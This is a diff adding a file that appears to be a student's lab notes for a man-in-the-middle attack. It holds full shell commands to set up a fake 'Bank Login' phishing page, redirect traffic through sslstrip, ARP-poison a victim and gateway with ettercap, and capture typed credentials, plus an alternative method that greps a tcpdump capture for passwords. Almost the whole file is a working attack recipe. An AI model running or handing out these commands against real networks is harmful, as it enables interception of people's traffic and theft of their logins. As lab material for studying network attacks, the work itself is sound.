@@ -1,0 +1,63 @@
+sudo apt install -y sslstrip ettercap-text-only apache2
+ip a
+sudo systemctl start apache2
+sudo systemctl status apache2
+sudo tee /var/www/html/index.html << 'EOF'
+<html>
+<body>
+<h2>Bank Login</h2>
+<form method="post">
+Email: <input type="text" name="email"><br>
+Password: <input type="password" name="password"><br>
+<input type="submit" value="Login">
+</form>
+</body>
+</html>
+EOF
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
+sslstrip -l 8080 -w captured.log #proceed this in terminal 1
+ip route | grep default (gateway ip)
+sudo ettercap -T -M arp:remote /VICTIM_IP// /GATEWAY_IP//
+sudo ettercap -T -M arp:remote /10.18.191.126// /10.18.191.208// #proceed this in terminal 3
+NOW,
+• Open browser
+• Go to: http://[YOUR_KALI_IP] (from Step 1)
+• Enter:
+o Email: student@college.edu
+o Password: MySecurePassword123
+• Click Login
+cat captured.log (IN TERMINAL 3)
+
+
+
+
+
+
+
+
+ALTERNATIVE APPROACH WORKED
+1. Simplified Attack Methodology
+Terminal 1
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+sudo iptables -t nat -F
+sudo ettercap -T -M arp:remote /VICTIM_IP// /GATEWAY_IP//
+eg. sudo ettercap -T -M arp:remote /10.100.192.81// /10.100.192.189//
+Terminal 2
+sudo tcpdump -i eth1 -w captured_traffic.pcap
+Terminal 3
+sudo systemctl start apache2
+2. Test the Attack
+From Windows Host (10.100.192.81):
+1. Open browser to http://10.100.192.74
+2. Enter credentials:
+o Email: student@college.edu
+o Password: MySecurePassword123
+3. Click Login
+3. Analyze Captured Data
+strings captured_traffic.pcap | grep -A 5 -B 5 "email\|password"
+4. Clean UP
+sudo iptables -t nat -F
+echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
+sudo systemctl stop apache2
